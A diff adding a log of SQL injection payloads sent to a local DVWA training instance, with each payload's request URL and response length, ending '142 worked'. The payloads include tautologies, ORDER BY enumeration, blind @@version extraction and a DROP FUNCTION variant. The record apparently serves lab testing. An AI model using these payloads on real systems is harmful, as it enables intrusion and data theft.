@@ -1,0 +1,569 @@
+ 'OR 1=1
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+1%3D1&Submit=Submit
+	159
+
+ 'OR 1=0
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+1%3D0&Submit=Submit
+	159
+
+ 'OR x=x
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+x%3Dx&Submit=Submit
+	160
+
+ 'OR x=y
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+x%3Dy&Submit=Submit
+	159
+
+ 'OR 1=1#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+1%3D1%23&Submit=Submit
+	4818
+
+ 'OR x=x#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+x%3Dx%23&Submit=Submit
+	48
+
+ 'OR x=y#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+x%3Dy%23&Submit=Submit
+	48
+
+ 'OR 1=1--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+1%3D1--&Submit=Submit
+	159
+
+ 'OR 1=0--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+1%3D0--&Submit=Submit
+	159
+
+ 'OR x=x--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+x%3Dx--&Submit=Submit
+	159
+
+ 'OR x=y--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+x%3Dy--&Submit=Submit
+	159
+
+ 'OR 3409=3409 AND ('pytW' LIKE 'pytW
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+3409%3D3409+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit
+	158
+
+ 'OR 3409=3409 AND ('pytW' LIKE 'pytY
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27OR+3409%3D3409+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit
+	158
+
+ 'HAVING 1=1
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27HAVING+1%3D1&Submit=Submit
+	159
+
+ 'HAVING 1=0
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27HAVING+1%3D0&Submit=Submit
+	159
+
+ 'HAVING 1=1--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27HAVING+1%3D1--&Submit=Submit
+	159
+
+ 'HAVING 1=0--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27HAVING+1%3D0--&Submit=Submit
+	159
+
+ 'AND 1=1
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+1%3D1&Submit=Submit
+	159
+
+ 'AND 1=0
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+1%3D0&Submit=Submit
+	159
+
+ 'AND 1=1--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+1%3D1--&Submit=Submit
+	159
+
+ 'AND 1=0--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+1%3D0--&Submit=Submit
+	159
+
+ 'AND 1083=1083 AND (1427=1427
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+1083%3D1083+AND+%281427%3D1427&Submit=Submit
+	159
+
+ 'AND 7506=9091 AND (5913=5913
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+7506%3D9091+AND+%285913%3D5913&Submit=Submit
+	159
+
+ 'AND 1083=1083 AND ('1427=1427
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+1083%3D1083+AND+%28%271427%3D1427&Submit=Submit
+	158
+
+ 'AND 7506=9091 AND ('5913=5913
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+7506%3D9091+AND+%28%275913%3D5913&Submit=Submit
+	158
+
+ 'AND 7300=7300 AND ('pKlZ'='pKlZ
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+7300%3D7300+AND+%28%27pKlZ%27%3D%27pKlZ&Submit=Submit
+	158
+
+ 'AND 7300=7300 AND ('pKlZ'='pKlY
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AND+7300%3D7300+AND+%28%27pKlZ%27%3D%27pKlY&Submit=Submit
+	158
+
+ 'AS INJECTX WHERE 1=1 AND 1=1
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AS+INJECTX+WHERE+1%3D1+AND+1%3D1&Submit=Submit
+	187
+
+ 'AS INJECTX WHERE 1=1 AND 1=0
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AS+INJECTX+WHERE+1%3D1+AND+1%3D0&Submit=Submit
+	187
+
+ 'AS INJECTX WHERE 1=1 AND 1=1#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AS+INJECTX+WHERE+1%3D1+AND+1%3D1%23&Submit=Submit
+	188
+
+ 'AS INJECTX WHERE 1=1 AND 1=0#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AS+INJECTX+WHERE+1%3D1+AND+1%3D0%23&Submit=Submit
+	188
+
+ 'AS INJECTX WHERE 1=1 AND 1=1--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AS+INJECTX+WHERE+1%3D1+AND+1%3D1--&Submit=Submit
+	189
+
+ 'AS INJECTX WHERE 1=1 AND 1=0--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27AS+INJECTX+WHERE+1%3D1+AND+1%3D0--&Submit=Submit
+	189
+
+ 'WHERE 1=1 AND 1=1
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27WHERE+1%3D1+AND+1%3D1&Submit=Submit
+	176
+
+ 'WHERE 1=1 AND 1=0
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27WHERE+1%3D1+AND+1%3D0&Submit=Submit
+	176
+
+ 'WHERE 1=1 AND 1=1#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27WHERE+1%3D1+AND+1%3D1%23&Submit=Submit
+	177
+
+ 'WHERE 1=1 AND 1=0#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27WHERE+1%3D1+AND+1%3D0%23&Submit=Submit
+	177
+
+ 'WHERE 1=1 AND 1=1--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27WHERE+1%3D1+AND+1%3D1--&Submit=Submit
+	178
+
+ 'WHERE 1=1 AND 1=0--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27WHERE+1%3D1+AND+1%3D0--&Submit=Submit
+	178
+
+ 'ORDER BY 1--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+1--&Submit=Submit
+	159
+
+ 'ORDER BY 2--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+2--&Submit=Submit
+	159
+
+ 'ORDER BY 3--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+3--&Submit=Submit
+	159
+
+ 'ORDER BY 4--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+4--&Submit=Submit
+	159
+
+ 'ORDER BY 5--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+5--&Submit=Submit
+	159
+
+ 'ORDER BY 6--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+6--&Submit=Submit
+	159
+
+ 'ORDER BY 7--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+7--&Submit=Submit
+	159
+
+ 'ORDER BY 8--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+8--&Submit=Submit
+	159
+
+ 'ORDER BY 9--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+9--&Submit=Submit
+	159
+
+ 'ORDER BY 10--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+10--&Submit=Submit
+	159
+
+ 'ORDER BY 11--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+11--&Submit=Submit
+	159
+
+ 'ORDER BY 12--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+12--&Submit=Submit
+	159
+
+ 'ORDER BY 13--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+13--&Submit=Submit
+	159
+
+ 'ORDER BY 14--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+14--&Submit=Submit
+	159
+
+ 'ORDER BY 15--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+15--&Submit=Submit
+	159
+
+ 'ORDER BY 16--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+16--&Submit=Submit
+	159
+
+ 'ORDER BY 17--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+17--&Submit=Submit
+	159
+
+ 'ORDER BY 18--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+18--&Submit=Submit
+	159
+
+ 'ORDER BY 19--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+19--&Submit=Submit
+	159
+
+ 'ORDER BY 20--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+20--&Submit=Submit
+	159
+
+ 'ORDER BY 21--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+21--&Submit=Submit
+	159
+
+ 'ORDER BY 22--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+22--&Submit=Submit
+	159
+
+ 'ORDER BY 23--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+23--&Submit=Submit
+	159
+
+ 'ORDER BY 24--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+24--&Submit=Submit
+	159
+
+ 'ORDER BY 25--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+25--&Submit=Submit
+	159
+
+ 'ORDER BY 26--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+26--&Submit=Submit
+	159
+
+ 'ORDER BY 27--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+27--&Submit=Submit
+	159
+
+ 'ORDER BY 28--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+28--&Submit=Submit
+	159
+
+ 'ORDER BY 29--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+29--&Submit=Submit
+	159
+
+ 'ORDER BY 30--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+30--&Submit=Submit
+	159
+
+ 'ORDER BY 31337--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+31337--&Submit=Submit
+	159
+
+ 'ORDER BY 3#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+3%23&Submit=Submit
+	48
+
+ 'ORDER BY 4#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+4%23&Submit=Submit
+	48
+
+ 'ORDER BY 5#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+5%23&Submit=Submit
+	48
+
+ 'ORDER BY 6#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+6%23&Submit=Submit
+	48
+
+ 'ORDER BY 7#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+7%23&Submit=Submit
+	48
+
+ 'ORDER BY 8#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+8%23&Submit=Submit
+	48
+
+ 'ORDER BY 9#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+9%23&Submit=Submit
+	48
+
+ 'ORDER BY 10#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+10%23&Submit=Submit
+	49
+
+ 'ORDER BY 11#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+11%23&Submit=Submit
+	49
+
+ 'ORDER BY 12#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+12%23&Submit=Submit
+	49
+
+ 'ORDER BY 13#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+13%23&Submit=Submit
+	49
+
+ 'ORDER BY 14#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+14%23&Submit=Submit
+	49
+
+ 'ORDER BY 15#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+15%23&Submit=Submit
+	49
+
+ 'ORDER BY 16#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+16%23&Submit=Submit
+	49
+
+ 'ORDER BY 17#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+17%23&Submit=Submit
+	49
+
+ 'ORDER BY 18#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+18%23&Submit=Submit
+	49
+
+ 'ORDER BY 19#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+19%23&Submit=Submit
+	49
+
+ 'ORDER BY 20#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+20%23&Submit=Submit
+	49
+
+ 'ORDER BY 21#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+21%23&Submit=Submit
+	49
+
+ 'ORDER BY 22#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+22%23&Submit=Submit
+	49
+
+ 'ORDER BY 23#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+23%23&Submit=Submit
+	49
+
+ 'ORDER BY 24#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+24%23&Submit=Submit
+	49
+
+ 'ORDER BY 25#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+25%23&Submit=Submit
+	49
+
+ 'ORDER BY 26#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+26%23&Submit=Submit
+	49
+
+ 'ORDER BY 27#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+27%23&Submit=Submit
+	49
+
+ 'ORDER BY 28#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+28%23&Submit=Submit
+	49
+
+ 'ORDER BY 29#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+29%23&Submit=Submit
+	49
+
+ 'ORDER BY 30#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+30%23&Submit=Submit
+	49
+
+ 'ORDER BY 31337#
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+31337%23&Submit=Submit
+	52
+
+ 'ORDER BY 1
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+1&Submit=Submit
+	159
+
+ 'ORDER BY 2
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+2&Submit=Submit
+	159
+
+ 'ORDER BY 3
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+3&Submit=Submit
+	159
+
+ 'ORDER BY 4
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+4&Submit=Submit
+	159
+
+ 'ORDER BY 5
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+5&Submit=Submit
+	159
+
+ 'ORDER BY 6
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+6&Submit=Submit
+	159
+
+ 'ORDER BY 7
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+7&Submit=Submit
+	159
+
+ 'ORDER BY 8
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+8&Submit=Submit
+	159
+
+ 'ORDER BY 9
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+9&Submit=Submit
+	159
+
+ 'ORDER BY 10
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+10&Submit=Submit
+	159
+
+ 'ORDER BY 11
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+11&Submit=Submit
+	159
+
+ 'ORDER BY 12
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+12&Submit=Submit
+	159
+
+ 'ORDER BY 13
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+13&Submit=Submit
+	159
+
+ 'ORDER BY 14
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+14&Submit=Submit
+	159
+
+ 'ORDER BY 15
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+15&Submit=Submit
+	159
+
+ 'ORDER BY 16
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+16&Submit=Submit
+	159
+
+ 'ORDER BY 17
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+17&Submit=Submit
+	159
+
+ 'ORDER BY 18
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+18&Submit=Submit
+	159
+
+ 'ORDER BY 19
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+19&Submit=Submit
+	159
+
+ 'ORDER BY 20
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+20&Submit=Submit
+	159
+
+ 'ORDER BY 21
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+21&Submit=Submit
+	159
+
+ 'ORDER BY 22
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+22&Submit=Submit
+	159
+
+ 'ORDER BY 23
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+23&Submit=Submit
+	159
+
+ 'ORDER BY 24
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+24&Submit=Submit
+	159
+
+ 'ORDER BY 25
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+25&Submit=Submit
+	159
+
+ 'ORDER BY 26
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+26&Submit=Submit
+	159
+
+ 'ORDER BY 27
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+27&Submit=Submit
+	159
+
+ 'ORDER BY 28
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+28&Submit=Submit
+	159
+
+ 'ORDER BY 29
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+29&Submit=Submit
+	159
+
+ 'ORDER BY 30
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+30&Submit=Submit
+	159
+
+ 'ORDER BY 31337
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27ORDER+BY+31337&Submit=Submit
+	159
+
+ 'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27RLIKE+%28SELECT+%28CASE+WHEN+%284346%3D4347%29+THEN+0x61646d696e+ELSE+0x28+END%29%29+AND+%27Txws%27%3D%27&Submit=Submit
+	60
+
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=%27IF%287423%3D7424%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--&Submit=Submit
+	210
+
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+	http://localhost/DVWA/vulnerabilities/sqli/?id=%27IF%287423%3D7423%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--&Submit=Submit
+	210
+
+'% AND 8310=8310 AND '%'='
+	http://localhost/DVWA/vulnerabilities/sqli/?id=%27%25+AND+8310%3D8310+AND+%27%25%27%3D%27&Submit=Submit
+	182
+
+'% AND 8310=8311 AND '%'='
+	http://localhost/DVWA/vulnerabilities/sqli/?id=%27%25+AND+8310%3D8311+AND+%27%25%27%3D%27&Submit=Submit
+	182
+
+ 'and (select substring(@@version,1,1))='X'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27X%27&Submit=Submit
+	162
+
+ 'and (select substring(@@version,1,1))='M'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27M%27&Submit=Submit
+	162
+
+ 'and (select substring(@@version,2,1))='i'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C2%2C1%29%29%3D%27i%27&Submit=Submit
+	162
+
+ 'and (select substring(@@version,2,1))='y'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C2%2C1%29%29%3D%27y%27&Submit=Submit
+	162
+
+ 'and (select substring(@@version,3,1))='c'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C3%2C1%29%29%3D%27c%27&Submit=Submit
+	162
+
+ 'and (select substring(@@version,3,1))='S'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C3%2C1%29%29%3D%27S%27&Submit=Submit
+	162
+
+ 'and (select substring(@@version,3,1))='X'
+	http://localhost/DVWA/vulnerabilities/sqli/?id=+%27and+%28select+substring%28%40%40version%2C3%2C1%29%29%3D%27X%27&Submit=Submit
+	162
+
+142 worked
